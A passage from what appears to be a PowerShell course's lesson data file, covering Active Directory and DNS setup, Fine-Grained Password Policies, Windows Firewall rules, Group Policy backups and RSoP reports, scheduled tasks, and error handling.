      'Promote a Server Core machine to a Domain Controller with `Install-WindowsFeature AD-Domain-Services` + `Install-ADDSForest`, manage DNS zones with `DnsServer` cmdlets, and apply strict password rules to privileged groups using Fine-Grained Password Policies (where lower Precedence numbers win).',
    summary:
      'How do you build a brand-new Active Directory domain on a headless Server Core machine? How does a client PC find a Domain Controller using DNS `SRV` records? And how do you enforce a 16-character password policy on Domain Admins while keeping a 12-character policy for regular staff? In this lesson, we master AD forest promotion, DNS server management, and Fine-Grained Password Policies (FGPP).',
    whyItMatters:
      'Active Directory cannot function without DNS, 90% of "Active Directory failures" in the real world are actually DNS misconfigurations! Knowing how to inspect `SRV` records and manage Fine-Grained Password Policies sets you apart as a senior infrastructure engineer.',
    learningObjectives: [
      'Promote a Windows Server to a Domain Controller using `Install-WindowsFeature AD-Domain-Services` and `Install-ADDSForest`',
      'Inspect forest, domain, DC, and anonymous LDAP `RootDSE` metadata using `Get-ADForest`, `Get-ADDomain`, `Get-ADDomainController`, and `Get-ADRootDSE`',
      'Manage DNS zones and resource records (`A`, `PTR`, `CNAME`, `SOA`, `SRV`) using the `DnsServer` module and client `Resolve-DnsName`',
      'Create Fine-Grained Password Policies (`New-ADFineGrainedPasswordPolicy`) and explain why a **lower Precedence number (`1` vs `10`) always wins**',
    ],
    keyTerms: [
      'Install-ADDSForest & AD-Domain-Services',
      'RootDSE (Get-ADRootDSE)',
      'DNS SRV & SOA Resource Records',
      'Add-DnsServerPrimaryZone & Add-DnsServerResourceRecordA',
      'Fine-Grained Password Policy (FGPP / PSO)',
      'Precedence (Lower Number = Higher Priority)',
    ],
    conceptSections: [
      {
        heading: 'Promoting a Domain Controller & Inspecting the Forest',
        body: [
          'Deploying Active Directory Domain Services (AD DS) on a headless Server Core machine is a two-step process:\n1. **Install the role binary bits:**\n   `Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools`\n2. **Promote the server to the first Domain Controller in a new Forest (and install DNS automatically):**\n   `Install-ADDSForest -DomainName "corp.local" -InstallDns:$true -Force`',
          'Once the Domain Controller reboots, four inspection cmdlets tell you everything about your environment:\n• **`Get-ADForest`:** Shows all domains in the forest, Global Catalogs, and Schema Master.\n• **`Get-ADDomain`:** Shows the Domain SID, NetBIOS name, PDC Emulator, and password policy container.\n• **`Get-ADDomainController`:** Shows the DC’s IP, Site name, and FSMO roles (`OperationMasterRoles`).\n• **`Get-ADRootDSE`:** Reads the top-level LDAP directory root (`defaultNamingContext`, `forestFunctionality`).',
        ],
      },
      {
        heading: 'DNS Server Management: Why Active Directory Lives and Breathes DNS',
        body: [
          'How does a workstation joining `corp.local` know which IP address is the Domain Controller? It queries DNS for **`SRV` (Service Locator) records** such as `_ldap._tcp.dc._msdcs.corp.local` and `_kerberos._tcp.corp.local`!',
          'With the **`DnsServer`** module (and **`DnsClient`** on workstations), you can manage all of DNS from PowerShell:\n• Create an AD-integrated Primary Forward Lookup Zone:\n  `Add-DnsServerPrimaryZone -Name "lab.corp.local" -ReplicationScope Domain`\n• Create an `A` (Host) record (and automatically create its reverse `PTR` record!):\n  `Add-DnsServerResourceRecordA -ZoneName "corp.local" -Name "filesrv01" -IPv4Address "192.168.153.50" -CreatePtr`\n• Inspect `SOA` (Start of Authority) or `SRV` records:\n  `Get-DnsServerResourceRecord -ZoneName "corp.local" -RRType "SOA"`\n• Test DNS resolution from any client (the modern PowerShell replacement for `nslookup`):\n  `Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.corp.local" -Type SRV`',
        ],
      },
      {
        heading: 'Fine-Grained Password Policies (FGPP): Why Precedence 1 Beats Precedence 50',
        body: [
          'By default, Active Directory’s Default Domain Policy only allows **one** password policy per domain. What if you want regular users to have a 12-character password, **but** require `Domain Admins` to have a **20-character password** and lock out after 3 bad attempts?',
          'We use **Fine-Grained Password Policies (FGPP)** - attached directly to **Users or Global Security Groups** (never to OUs!):\n1. Create the policy: **`New-ADFineGrainedPasswordPolicy -Name "PSO-Tier0-Admins" -Precedence 1 -MinPasswordLength 20 -LockoutThreshold 3`**\n2. Apply it to the group: **`Add-ADFineGrainedPasswordPolicySubject -Identity "PSO-Tier0-Admins" -Subjects "Domain Admins"`**\n• **The Golden Rule of FGPP Precedence:** Just like a race where **1st place beats 10th place**, if a user belongs to two groups with different password policies, the policy with the **LOWER `Precedence` integer (`1` beats `10`) ALWAYS WINS!**\n• Check which policy actually applies to a specific user: **`Get-ADUserResultantPasswordPolicy -Identity ihaider`**.',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Clients locate Domain Controllers via DNS `SRV` records, and Fine-Grained Password Policies attach to Security Groups (not OUs!) where the lowest `Precedence` number wins.',
      },
      {
        type: 'gotcha',
        title: 'Two Classic FGPP Traps',
        body: '1. You **cannot** link a Fine-Grained Password Policy to an Organizational Unit (OU), you attach it to a **Security Group** (or individual user).\n2. **Lower `Precedence` number = Higher Priority** (`Precedence 1` overrides `Precedence 100`).',
      },
      {
        type: 'try',
        title: 'Replace nslookup with Resolve-DnsName',
        body: 'Run `Resolve-DnsName -Name microsoft.com -Type A` on your machine right now. Unlike `nslookup`, `Resolve-DnsName` returns real `.NET` objects you can filter and pipe!',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'New-ADFineGrainedPasswordPolicy',
        aliases: [],
        syntax: 'New-ADFineGrainedPasswordPolicy [-Name] <String> -Precedence <Int32> [-MinPasswordLength <Int32>] [-LockoutThreshold <Int32>]',
        parameters: [
          {
            name: '-Precedence',
            type: 'Int32',
            description: 'Determines priority when multiple policies apply to a user. Lower integers (e.g., 1) take precedence over higher integers (e.g., 50).',
          },
          {
            name: '-MinPasswordLength',
            type: 'Int32',
            description: 'Minimum number of characters required for the password.',
          },
        ],
        examples: [
          'New-ADFineGrainedPasswordPolicy -Name "Admin-20Char-PSO" -Precedence 1 -MinPasswordLength 20 -ComplexityEnabled $true',
        ],
      },
      {
        cmdlet: 'Resolve-DnsName',
        aliases: [],
        syntax: 'Resolve-DnsName [-Name] <String> [-Type <RecordType>] [-Server <String[]>]',
        parameters: [
          {
            name: '-Type',
            type: 'RecordType',
            description: 'Specifies the DNS record type to query (A, AAAA, CNAME, MX, NS, PTR, SOA, SRV, TXT).',
          },
        ],
        examples: ['Resolve-DnsName -Name "_ldap._tcp.dc._msdcs.corp.local" -Type SRV'],
      },
    ],
    codeExamples: [
      {
        title: 'Promoting AD DS, Managing DNS Records, and Applying Fine-Grained Password Policies',
        description: 'Inspect domain metadata, create DNS A records, and enforce a Tier-0 Admin Fine-Grained Password Policy.',
        code: `# 1. Inspect Active Directory Forest, Domain, and RootDSE metadata
Get-ADForest | Select-Object Name, ForestMode, Domains, SchemaMaster
Get-ADRootDSE | Select-Object defaultNamingContext, dnsHostName, forestFunctionality

# 2. Create a DNS Host (A) record in the corp.local zone and verify with Resolve-DnsName
Add-DnsServerResourceRecordA -ZoneName 'corp.local' -Name 'intranet' -IPv4Address '192.168.153.80' -CreatePtr
Resolve-DnsName -Name 'intranet.corp.local' -Type A

# 3. Create a high-priority Fine-Grained Password Policy (Precedence 10) for Admins
New-ADFineGrainedPasswordPolicy -Name 'PSO-Admins-Strict' \`
  -Precedence 10 \`
  -MinPasswordLength 18 \`
  -ComplexityEnabled $true \`
  -LockoutThreshold 5

# Attach the policy to theGRP_Eng_Admins security group and verify effective policy on a user
Add-ADFineGrainedPasswordPolicySubject -Identity 'PSO-Admins-Strict' -Subjects 'GRP_Eng_Admins'
Get-ADUserResultantPasswordPolicy -Identity 'ihaider' | Select-Object Name, Precedence, MinPasswordLength`,
        output: `Name       ForestMode          Domains      SchemaMaster
----       ----------          -------      ------------
corp.local Windows2025Forest   {corp.local} SRV-DC01.corp.local

Name                 Type   TTL   Section IPAddress
----                 ----   ---   ------- ---------
intranet.corp.local  A      3600  Answer  192.168.153.80

Name              Precedence MinPasswordLength
----              ---------- -----------------
PSO-Admins-Strict         10                18`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Trying to apply a Fine-Grained Password Policy (`Add-ADFineGrainedPasswordPolicySubject`) to an Organizational Unit (OU).',
        cause: 'Active Directory Password Settings Objects (PSOs) can only be linked to **Users** or **Global Security Groups**, never OUs.',
        fix: 'Create a Shadow Security Group containing the users in that OU, and attach the FGPP to that Security Group.',
      },
    ],
    tryItYourself: [
      'Run `Get-DnsClientCache | Select-Object -First 10 Entry, RecordName, RecordType, Data` on your PC to inspect your local DNS resolver cache.',
      'Run `Resolve-DnsName -Name google.com -Type MX` to see Google’s mail exchange servers returned as structured PowerShell objects.',
    ],
    knowledgeCheck: [
      {
        question: 'If an Active Directory user belongs to two security groups, Group A (linked to a Fine-Grained Password Policy with Precedence 10) and Group B (linked to a policy with Precedence 50), which password policy wins?',
        options: [
          'The policy with Precedence 50 wins because 50 is larger',
          'The policy with Precedence 10 wins because lower Precedence numbers have higher priority',
          'Neither applies',
          'Both minimum lengths are added together',
        ],
        correctIndex: 1,
        explanation: 'In Fine-Grained Password Policies, Precedence 1 is highest priority, so Precedence 10 overrides Precedence 50.',
      },
      {
        question: 'Which DNS record type do Windows computers query to locate Active Directory Domain Controllers (LDAP and Kerberos services)?',
        options: ['MX (Mail Exchange)', 'SRV (Service Locator)', 'TXT (Text)', 'CNAME (Alias)'],
        correctIndex: 1,
        explanation: 'Active Directory relies on DNS SRV records (such as _ldap._tcp.dc._msdcs.<domain>) so clients can discover Domain Controllers dynamically.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 13: GROUP POLICY (GPO), WINDOWS FIREWALL & TASK AUTOMATION
  // ==========================================================================
  {
    id: '13-1',
    chapterId: 'chapter-13',
    slug: 'firewall-profiles-and-rules',
    title: 'Windows Defender Firewall: NLA Profiles, Rules & DisplayGroups',
    subtitle: 'Open remote management ports cleanly by DisplayGroup instead of guessing individual port numbers',
    estimatedMinutes: 25,
    oneSentenceSummary:
      'Network Location Awareness (NLA) assigns every NIC to the `Domain`, `Private`, or `Public` firewall profile, and enabling rules by `-DisplayGroup` opens all required ports for a service cleanly without turning off the firewall.',
    summary:
      'When a junior admin cannot connect to a Windows Server remotely, their worst instinct is to disable the entire Windows Firewall (`Set-NetFirewallProfile -Enabled False`). A professional engineer never blinds the entire firewall, instead, they understand how **Network Location Awareness (NLA)** selects the active profile (`Domain`, `Private`, `Public`) and enable only the exact **`-DisplayGroup`** needed!',
    whyItMatters:
      'On a headless Server Core machine, remote management snap-ins (Event Viewer, Disk Management, Service Manager, File Sharing) are blocked by default until you enable their specific Firewall DisplayGroups via PowerShell.',
    learningObjectives: [
      'Explain how Network Location Awareness (NLA) assigns the `Domain`, `Private`, or `Public` firewall profile to each network adapter',
      'Inspect and configure firewall profile defaults using `Get-NetFirewallProfile` and `Set-NetFirewallProfile`',
      'Query and enable built-in firewall rules safely by `-DisplayGroup` using `Get-NetFirewallRule` and `Enable-NetFirewallRule`',
      'Create custom inbound/outbound port rules using `New-NetFirewallRule`',
    ],
    keyTerms: [
      'Network Location Awareness (NLA)',
      'Domain, Private & Public Firewall Profiles',
      'Get-NetFirewallProfile & Set-NetFirewallProfile',
      'Get-NetFirewallRule & Enable-NetFirewallRule',
      '-DisplayGroup (Rule Grouping)',
      'New-NetFirewallRule',
    ],
    conceptSections: [
      {
        heading: 'The 3 Firewall Profiles & Network Location Awareness (NLA)',
        body: [
          'Windows Defender Firewall maintains three separate rulebooks called **Profiles**, and the **Network Location Awareness (NLA)** service automatically picks the right one for each network interface:\n1. **`Domain` Profile:** Assigned automatically when NLA can authenticate to your Active Directory Domain Controller on that network. Allows enterprise management rules.\n2. **`Private` Profile:** Assigned manually by an admin for a trusted home or isolated lab LAN (when no AD Domain Controller is present).\n3. **`Public` Profile (Default for Unknown Networks):** The strictest lockdown profile, designed for coffee-shop Wi-Fi or untrusted networks. Blocks network discovery and inbound file sharing.',
          'How do you check which profile is currently assigned to your network card? Run **`Get-NetConnectionProfile`**. If a lab server in a workgroup is stuck on `Public`, switch it to `Private` with:\n`Set-NetConnectionProfile -InterfaceIndex 4 -NetworkCategory Private`',
        ],
      },
      {
        heading: 'Enabling Rules by -DisplayGroup (Why You Never Turn Off the Whole Firewall)',
        body: [
          'Windows ships with hundreds of pre-built firewall rules grouped into logical categories called **DisplayGroups** (for example, `"File and Printer Sharing"`, `"Windows Remote Management"`, `"Remote Event Log Management"`, `"Remote Service Management"`).',
          'Instead of memorizing six different RPC and SMB port numbers, simply enable the built-in DisplayGroup:\n1. Discover the exact DisplayGroup name:\n   `Get-NetFirewallRule | Select-Object -ExpandProperty DisplayGroup -Unique | Sort-Object`\n2. Enable all rules in that group in one command:\n   `Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"`\n   `Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management"`',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'Never disable `Set-NetFirewallProfile -Enabled False` in production, use `Enable-NetFirewallRule -DisplayGroup "..."` or `New-NetFirewallRule` to open only the exact traffic required.',
      },
      {
        type: 'try',
        title: 'Check Your Current Network Category and Firewall Profiles',
        body: 'Run `Get-NetConnectionProfile` and `Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction` to see your active firewall posture.',
      },
      {
        type: 'pro',
        title: 'Testing Remote TCP Ports with Test-NetConnection',
        body: 'Before blaming a service, test whether the remote firewall port is open using `Test-NetConnection -ComputerName 192.168.153.210 -Port 5985` ( checks both ICMP ping and the TCP 3-way handshake!).',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Enable-NetFirewallRule',
        aliases: [],
        syntax: 'Enable-NetFirewallRule [-DisplayGroup <String[]>] [-DisplayName <String[]>] [-Name <String[]>]',
        parameters: [
          {
            name: '-DisplayGroup',
            type: 'String[]',
            description: 'Enables all firewall rules belonging to the specified functional group (e.g., "Windows Remote Management").',
          },
        ],
        examples: [
          'Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"',
          'Enable-NetFirewallRule -DisplayGroup "Windows Remote Management"',
        ],
      },
      {
        cmdlet: 'New-NetFirewallRule',
        aliases: [],
        syntax: 'New-NetFirewallRule -DisplayName <String> -Direction <Direction> -Protocol <String> -LocalPort <String[]> -Action <Action>',
        parameters: [
          {
            name: '-Direction',
            type: 'Direction',
            description: 'Specifies Inbound or Outbound traffic.',
          },
          {
            name: '-LocalPort',
            type: 'String[]',
            description: 'Specifies the TCP or UDP port number(s) (e.g., 443, 8080).',
          },
          {
            name: '-Action',
            type: 'Action',
            description: 'Specifies Allow or Block.',
          },
        ],
        examples: [
          'New-NetFirewallRule -DisplayName "Allow Internal HTTPS App" -Direction Inbound -Protocol TCP -LocalPort 8443 -Action Allow -Profile Domain,Private',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Inspecting Firewall Profiles, Enabling DisplayGroups, and Creating Custom Port Rules',
        description: 'Audit the 3 firewall profiles, enable remote management groups on Server Core, and open a custom TCP port.',
        code: `# 1. Inspect the 3 Windows Defender Firewall profiles (Domain, Private, Public)
Get-NetFirewallProfile |
  Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction

# 2. Check which network profile NLA assigned to each active NIC
Get-NetConnectionProfile |
  Select-Object InterfaceAlias, NetworkCategory, IPv4Connectivity

# 3. Enable built-in firewall rules by DisplayGroup for Server Core remote management
Enable-NetFirewallRule -DisplayGroup 'Windows Remote Management'
Enable-NetFirewallRule -DisplayGroup 'Remote Event Log Management'

# 4. Create a custom Inbound TCP rule for an internal web service on port 8443
New-NetFirewallRule -DisplayName 'Allow Internal Portal 8443' \`
  -Direction Inbound \`
  -Protocol TCP \`
  -LocalPort 8443 \`
  -Profile Domain, Private \`
  -Action Allow`,
        output: `Name    Enabled DefaultInboundAction DefaultOutboundAction
----    ------- -------------------- ---------------------
Domain     True        NotConfigured         NotConfigured
Private    True        NotConfigured         NotConfigured
Public     True        NotConfigured         NotConfigured

InterfaceAlias NetworkCategory IPv4Connectivity
-------------- --------------- ----------------
Ethernet0      DomainAuthenticated     Internet`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Creating a custom firewall rule while leaving `-Profile Any` on a laptop that connects to public airport Wi-Fi.',
        cause: 'By default, `New-NetFirewallRule` applies to all profiles (`Domain`, `Private`, and `Public`) unless you restrict `-Profile`.',
        fix: 'Always specify `-Profile Domain` (or `-Profile Domain, Private`) so internal service ports stay closed when on `Public` networks.',
      },
    ],
    tryItYourself: [
      'Run `Get-NetFirewallRule -Enabled True -Direction Inbound | Select-Object -First 10 DisplayName, DisplayGroup, Profile` to see which inbound ports are currently open on your machine.',
      'Run `Test-NetConnection -ComputerName microsoft.com -Port 443` to test a live TCP handshake.',
    ],
    knowledgeCheck: [
      {
        question: 'Which Windows service automatically detects whether a network interface is connected to an Active Directory domain and switches the firewall to the Domain profile?',
        options: [
          'Print Spooler',
          'Network Location Awareness (NLA)',
          'Task Scheduler',
          'Windows Installer',
        ],
        correctIndex: 1,
        explanation: 'Network Location Awareness (NLA) identifies the network and applies the Domain, Private, or Public firewall profile automatically.',
      },
      {
        question: 'What is the safest and cleanest way to allow "File and Printer Sharing" through Windows Defender Firewall via PowerShell?',
        options: [
          'Set-NetFirewallProfile -All -Enabled False',
          'Enable-NetFirewallRule -DisplayGroup "File and Printer Sharing"',
          'Stop-Service mpsdrv',
          'Delete system32\\firewall.cpl',
        ],
        correctIndex: 1,
        explanation: 'Enabling the built-in DisplayGroup opens only the exact ports and protocols required for that feature while keeping the firewall active.',
      },
    ],
  },

  {
    id: '13-2',
    chapterId: 'chapter-13',
    slug: 'gpo-rsop-and-scheduled-tasks',
    title: 'Group Policy Administration (GPO & RSoP) and Windows Scheduled Tasks',
    subtitle: 'Trigger remote policy refreshes, audit effective GPO settings in HTML, and schedule automated scripts',
    estimatedMinutes: 30,
    oneSentenceSummary:
      'The `GroupPolicy` module lets you create, back up, link, and audit Group Policy Objects (`Get-GPO`, `Backup-Gpo`, `Invoke-GPUpdate`, `Get-GPResultantSetOfPolicy`), while `ScheduledTasks` automates recurring background scripts.',
    summary:
      'In an Active Directory domain, **Group Policy Objects (GPOs)** push security baselines, registry settings, and login scripts to thousands of machines automatically. In this lesson, we remember the GPO inheritance order (**LSDOU**: Local → Site → Domain → OU), manage and back up GPOs with PowerShell, generate HTML **Resultant Set of Policy (RSoP)** reports to troubleshoot why a setting won or lost, and schedule recurring `.ps1` maintenance scripts with `Register-ScheduledTask`.',
    whyItMatters:
      'Before making any change to a production Group Policy Object, a senior admin always runs `Backup-Gpo -All` so they can roll back in 5 seconds, and uses `Get-GPResultantSetOfPolicy` to prove which GPO applied to a target server.',
    learningObjectives: [
      'State the GPO evaluation order (**L → S → D → OU**: Local, Site, Domain, Organizational Unit, where the last applied policy wins)',
      'Create, link, back up, and remotely refresh GPOs using `New-GPO`, `New-GPLink`, `Backup-Gpo`, and `Invoke-GPUpdate`',
      'Generate an HTML Resultant Set of Policy (RSoP) report using `Get-GPResultantSetOfPolicy -ReportType Html`',
      'Build and register automated Windows Scheduled Tasks using `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, and `Register-ScheduledTask`',
    ],
    keyTerms: [
      'Group Policy Object (GPO)',
      'LSDOU Inheritance Order (Local → Site → Domain → OU)',
      'Get-GPO, New-GPO, New-GPLink & Backup-Gpo',
      'Invoke-GPUpdate (Remote Policy Refresh)',
      'Resultant Set of Policy (RSoP / Get-GPResultantSetOfPolicy)',
      'Register-ScheduledTask (Action + Trigger)',
    ],
    conceptSections: [
      {
        heading: 'GPO Inheritance (LSDOU), Backups, and Remote Policy Refreshes',
        body: [
          'When a domain computer boots or a user logs in, Windows applies Group Policies in strict **LSDOU** order:\n1. **L**ocal Group Policy (on the machine itself)\n2. **S**ite-level GPOs\n3. **D**omain-level GPOs (like the Default Domain Policy)\n4. **O**rganizational **U**nit (OU) GPOs (from parent OU down to child OU)\nBecause policies apply in that sequence, **the last policy applied (the closest child OU) overwrites earlier ones** - unless a higher GPO is marked **Enforced**!',
          'Key `GroupPolicy` cmdlets I use every week:\n• List all GPOs in the domain: **`Get-GPO -All`**\n• Create and link a new GPO to an OU:\n  `New-GPO -Name "SEC-Server-Hardening" | New-GPLink -Target "OU=Servers,DC=corp,DC=local"`\n• Back up every GPO in the domain before making edits:\n  `Backup-Gpo -All -Path "C:\\GPOBackups"`\n• Force a remote computer to refresh its policies immediately:\n  `Invoke-GPUpdate -Computer "SRV-CORE01" -Force`',
        ],
      },
      {
        heading: 'Troubleshooting GPOs with Resultant Set of Policy (RSoP)',
        body: [
          'When 15 different GPOs are linked across a domain and an OU, how do you figure out *which* GPO actually won a conflict on `SRV-CORE01`? You calculate the **Resultant Set of Policy (RSoP)** and export it as a self-contained HTML report:\n`Get-GPResultantSetOfPolicy -Computer "SRV-CORE01" -ReportType Html -Path "C:\\Reports\\SRV-CORE01-RSoP.html"`\nOpen that HTML file in any browser and it shows every single winning policy setting and the exact GPO name that delivered it!',
        ],
      },
      {
        heading: 'Automating Recurring Scripts with Windows Scheduled Tasks',
        body: [
          'A script is only truly automated when you don’t have to remember to run it yourself. In PowerShell, registering a **Windows Scheduled Task** is like assembling three Lego pieces:\n1. **The Action (`New-ScheduledTaskAction`):** *What* program and arguments to launch (`powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\Scripts\\NightlyBackup.ps1"`).\n2. **The Trigger (`New-ScheduledTaskTrigger`):** *When* to run it (`-Daily -At 2:00AM` or `-AtStartup`).\n3. **Register (`Register-ScheduledTask`):** Combines the Action, Trigger, Task Name, and User Account (`-User "SYSTEM"`) into the Windows Task Scheduler!',
        ],
      },
    ],
    calloutNotes: [
      {
        type: 'key',
        title: 'The One-Sentence Version',
        body: 'GPOs evaluate in **LSDOU** order (where the closest OU wins), `Get-GPResultantSetOfPolicy` generates an HTML report proving which GPO won, and `Register-ScheduledTask` combines an Action + Trigger to run scripts on a schedule.',
      },
      {
        type: 'pro',
        title: 'Always Back Up GPOs Before Editing',
        body: 'Running `Backup-Gpo -All -Path C:\\GPOBackups` takes 3 seconds and lets you restore any accidentally broken GPO instantly with `Restore-GPO -Name "..." -Path C:\\GPOBackups`.',
      },
      {
        type: 'gotcha',
        title: 'Running a .ps1 Script in New-ScheduledTaskAction',
        body: 'Task Scheduler runs `.exe` binaries, not `.ps1` files directly! Always set `-Execute "powershell.exe"` (or `"pwsh.exe"`) and pass your script in `-Argument "-NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\YourScript.ps1"`.',
      },
    ],
    commandBreakdowns: [
      {
        cmdlet: 'Get-GPResultantSetOfPolicy',
        aliases: [],
        syntax: 'Get-GPResultantSetOfPolicy [-Computer <String>] [-User <String>] -ReportType <ReportType> -Path <String>',
        parameters: [
          {
            name: '-ReportType',
            type: 'ReportType',
            description: 'Specifies Html or Xml format for the output RSoP report.',
          },
          {
            name: '-Path',
            type: 'String',
            description: 'The file path where the HTML or XML report will be saved.',
          },
        ],
        examples: [
          'Get-GPResultantSetOfPolicy -ReportType Html -Path C:\\Reports\\RSoP.html',
        ],
      },
      {
        cmdlet: 'Register-ScheduledTask',
        aliases: [],
        syntax: 'Register-ScheduledTask [-TaskName] <String> -Action <CimInstance> -Trigger <CimInstance[]> [-User <String>]',
        parameters: [
          {
            name: '-Action',
            type: 'CimInstance',
            description: 'The task action created with New-ScheduledTaskAction.',
          },
          {
            name: '-Trigger',
            type: 'CimInstance[]',
            description: 'The schedule trigger created with New-ScheduledTaskTrigger.',
          },
        ],
        examples: [
          'Register-ScheduledTask -TaskName "NightlyAudit" -Action $action -Trigger $trigger -User "SYSTEM"',
        ],
      },
    ],
    codeExamples: [
      {
        title: 'Backing Up GPOs, Generating HTML RSoP Reports, and Registering a Scheduled Task',
        description: 'Manage Group Policy backups and RSoP reports, then schedule a nightly PowerShell script at 02:00 AM.',
        code: `# 1. List all GPOs and back them up to a timestamped folder
Get-GPO -All | Select-Object DisplayName, GpoStatus, ModificationTime
Backup-Gpo -All -Path 'C:\\Backups\\GPOs'

# 2. Generate an HTML Resultant Set of Policy (RSoP) report for troubleshooting
Get-GPResultantSetOfPolicy -Computer 'SRV-CORE01' \`
  -ReportType Html \`
  -Path 'C:\\Backups\\SRV-CORE01-RSoP.html'

# 3. Create and register a Nightly PowerShell Scheduled Task (02:00 AM Daily as SYSTEM)
$action  = New-ScheduledTaskAction -Execute 'powershell.exe' \`
             -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\\Scripts\\Audit-Server.ps1"'
$trigger = New-ScheduledTaskTrigger -Daily -At '02:00AM'

Register-ScheduledTask -TaskName 'PSAcademy-Nightly-Audit' \`
  -Action $action \`
  -Trigger $trigger \`
  -User 'NT AUTHORITY\\SYSTEM' \`
  -Description 'Runs nightly server security audit script'`,
        output: `DisplayName                  GpoStatus        ModificationTime
-----------                  ---------        ----------------
Default Domain Policy        AllSettingsEnabled 11/3/2026 9:00:00 AM
SEC-Server-Hardening         AllSettingsEnabled 11/3/2026 11:30:00 PM

TaskPath   TaskName                 State
--------   --------                 -----
\\          PSAcademy-Nightly-Audit  Ready`,
      },
    ],
    mistakesAndTraps: [
      {
        mistake: 'Creating a GPO with `New-GPO -Name "MyPolicy"` and wondering why no computers receive its settings.',
        cause: '`New-GPO` creates the policy object in the domain’s Group Policy Objects container, but it is **unlinked** until you attach it to a Domain or OU with `New-GPLink`!',
        fix: 'Always link your new GPO to its target OU or Domain using `New-GPLink -Name "MyPolicy" -Target "OU=Servers,DC=corp,DC=local"`.',
      },
    ],
    tryItYourself: [
      'Run `Get-ScheduledTask | Where-Object State -eq "Ready" | Select-Object -First 10 TaskName, TaskPath, State` on your machine to inspect active scheduled tasks.',
      'Build a `$trigger = New-ScheduledTaskTrigger -Daily -At 3am` object in memory and pipe `$trigger | Format-List *` to inspect its properties.',
    ],
    knowledgeCheck: [
      {
        question: 'In what order does Windows evaluate Group Policy Objects (where the last applied policy wins unless Enforced)?',
        options: [
          'OU → Domain → Site → Local',
          'LSDOU: Local → Site → Domain → Organizational Unit (OU)',
          'Alphabetical order by GPO name',
          'Random order',
        ],
        correctIndex: 1,
        explanation: 'Group Policy is processed in LSDOU order (Local, Site, Domain, Parent OU, Child OU), so the closest OU policy is applied last and wins conflicts.',
      },
      {
        question: 'Which cmdlet generates an HTML report showing the effective Resultant Set of Policy (RSoP) applied to a computer and user?',
        options: [
          'Get-GPResultantSetOfPolicy -ReportType Html -Path report.html',
          'Export-GpoHtml',
          'Invoke-GPUpdate',
          'Backup-Gpo',
        ],
        correctIndex: 0,
        explanation: 'Get-GPResultantSetOfPolicy calculates the effective policies and writes a detailed HTML or XML report to disk.',
      },
    ],
  },

  // ==========================================================================
  // CHAPTER 14: PROFESSIONAL TOOLMAKING: ADVANCED FUNCTIONS, SPLATTING & ERROR HANDLING
  // ==========================================================================
  {
    id: '14-1',
    chapterId: 'chapter-14',
    slug: 'error-handling-and-splatting',
    title: 'Bulletproof Error Handling (Try/Catch/Finally) & Parameter @Splatting',
    subtitle: 'Why Try/Catch silently misses errors by default, and how -ErrorAction Stop and @Splatting make scripts rock-solid',
    estimatedMinutes: 25,
    oneSentenceSummary:
      '`try / catch` only catches **terminating** errors, so you must add `-ErrorAction Stop` to force cmdlet failures into your `catch` block, and Parameter Splatting (`@params`) turns messy 10-parameter lines into clean hashtables.',
    summary:
      'Have you ever wrapped a failing command inside a `try { Get-Item C:\\MissingFile.txt } catch { ... }` block and watched PowerShell print a giant red error message on the screen while **completely ignoring your `catch` block**? That single quirk trips up 90% of PowerShell scripters! In this lesson, you will learn the difference between Non-Terminating and Terminating errors, force errors into `catch` using `-ErrorAction Stop`, and clean up long commands with **Parameter Splatting (`@params`)**.',
    whyItMatters:
      'Production automation must handle offline servers, missing files, and permission errors gracefully, and nobody wants to debug a 350-character command line full of fragile backticks when `@Splatting` makes it clean.',
    learningObjectives: [
      'Distinguish between a **Non-Terminating Error** (default cmdlet warning that keeps the pipeline running) and a **Terminating Error** (halts execution and triggers `catch`)',
      'Add **`-ErrorAction Stop`** inside `try { ... }` so non-terminating errors trigger the `catch { ... }` block reliably',
      'Inspect the automatic **`$_`** (`$PSItem`) error record inside `catch` (`$_.Exception.Message`) and run cleanup code in `finally { ... }`',
      'Replace long multi-parameter command calls with clean **Parameter Splatting (`@hashtable` with `@`, not `$`!)**',
    ],
    keyTerms: [
      'Terminating vs. Non-Terminating Error',
      '-ErrorAction Stop (SilentlyContinue, Continue, Stop)',
      'try / catch / finally',
      '$_.Exception.Message & $Error[0]',
      'Parameter Splatting (@params vs $params)',
    ],
    conceptSections: [
      {
        heading: 'Why try / catch Ignores Cmdlet Errors Unless You Add -ErrorAction Stop!',
        body: [
          'Remember how PowerShell is designed to process 100 servers or 1,000 files in a single pipeline? Suppose Server #3 out of 100 is offline. If PowerShell crashed the entire script on Server #3, Servers #4 through #100 would never get processed!',
          'Therefore, PowerShell has **two kinds of errors**:\n1. **Non-Terminating Errors (Default):** The cmdlet writes a red error message to the Error Stream, **and keeps going to the next item**. Because it does not halt execution, **a Non-Terminating Error does NOT trigger a `catch` block!**\n2. **Terminating Errors:** A fatal error that halts that pipeline immediately **and jumps straight into your `catch { ... }` block**.',
          '**The Golden Rule of `try / catch`:** Whenever you put a cmdlet inside a `try { ... }` block, add **`-ErrorAction Stop`** to that cmdlet! `-ErrorAction Stop` tells PowerShell: *"Convert any non-terminating error on this command into a terminating error so my `catch` block catches it!"*',
        ],
      },
      {
        heading: 'Parameter Splatting (@params): Death to the Backtick!',
        body: [
